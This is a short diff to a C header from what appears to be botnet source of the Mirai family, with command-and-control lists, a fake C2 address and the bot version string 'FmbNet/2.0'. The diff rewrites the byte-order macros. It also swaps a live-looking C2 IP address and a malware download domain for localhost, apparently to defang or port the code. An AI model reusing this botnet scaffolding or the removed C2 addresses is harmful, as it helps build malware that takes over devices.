@@ -17,7 +17,16 @@ typedef char BOOL;
 typedef uint32_t ipv4_t;
 typedef uint16_t port_t;
 
-#define INET_ADDR(o1,o2,o3,o4) (htonl((o1 << 24) | (o2 << 16) | (o3 << 8) | (o4 << 0)))
+#if __BYTE_ORDER__ == __ORDER_BIG_ENDIAN__
+#define NP_HTONL(x) ((uint32_t)(x))
+#define NP_HTONS(x) ((uint16_t)(x))
+#else
+#define NP_HTONL(x) ((uint32_t)__builtin_bswap32((uint32_t)(x)))
+#define NP_HTONS(x) ((uint16_t)__builtin_bswap16((uint16_t)(x)))
+#endif
+
+#define INET_ADDR(o1,o2,o3,o4) \
+        NP_HTONL(((uint32_t)(o1) << 24) | ((uint32_t)(o2) << 16) | ((uint32_t)(o3) << 8) | (uint32_t)(o4))
 
 #ifndef AF_ALG
 #define AF_ALG 38
@@ -37,10 +46,10 @@ extern struct cnc_addr CNC_LIST[];
 #define FAKE_CNC_ADDR INET_ADDR(65,222,202,53)
 #define FAKE_CNC_PORT 80
 
-#define CNC_IP_DEFAULT "195.209.219.35"
-#define BINS_DOMAIN_DEFAULT "suck.tcpmalware.live"
-#define SCANIP (int)inet_addr((const char*)"195.209.219.35")
-#define SERVIP (int)inet_addr((const char*)"195.209.219.35")
+#define CNC_IP_DEFAULT "127.0.0.1"
+#define BINS_DOMAIN_DEFAULT "localhost"
+#define SCANIP (int)inet_addr((const char*)"127.0.0.1")
+#define SERVIP (int)inet_addr((const char*)"127.0.0.1")
 
 #ifndef BOT_VERSION
 #define BOT_VERSION "FmbNet/2.0"
